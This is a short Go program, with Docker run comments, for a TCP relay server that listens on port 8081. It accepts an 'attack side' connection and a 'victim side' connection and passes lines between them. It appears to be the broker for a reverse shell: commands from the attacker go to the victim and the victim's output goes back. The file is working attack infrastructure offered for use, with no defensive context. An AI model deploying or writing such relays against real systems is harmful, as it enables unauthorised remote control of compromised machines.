package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"sync"
)

func receiveFromAttackSendToVictim(attc, vict net.Conn) {
	for {
		message, err := bufio.NewReader(attc).ReadString('\n')
		if err != nil {
			log.Fatal(err)
		}

		_, err = vict.Write([]byte(message + "\n"))
		if err != nil {
			fmt.Println("connection error")
			return
		}
	}
}

func receiveFromVictimSendToAttack(attc, vict net.Conn) {
	for {
		scanner := bufio.NewScanner(vict)

		for scanner.Scan() {
			fmt.Println(scanner.Text())
			_, err := attc.Write([]byte(scanner.Text() + "\n"))
			if err != nil {
				fmt.Println("connection error")
				return
			}
		}
	}
}

func main() {
	fmt.Println("Launching server...")

	ln, _ := net.Listen("tcp", "0.0.0.0:8081")
	fmt.Println("Waiting for attack side")
	connAttack, _ := ln.Accept()
	fmt.Println("Waiting for victim side")
	connVictim, _ := ln.Accept()

	wg := sync.WaitGroup{}
	wg.Add(2)

	go func() {
		defer wg.Done()
		receiveFromAttackSendToVictim(connAttack, connVictim)
	}()
	go func() {
		defer wg.Done()
		receiveFromVictimSendToAttack(connAttack, connVictim)
	}()

	wg.Wait()
}

// docker build -t iedesy/server .
// docker run --rm -p 8081:8081 iedesy/server
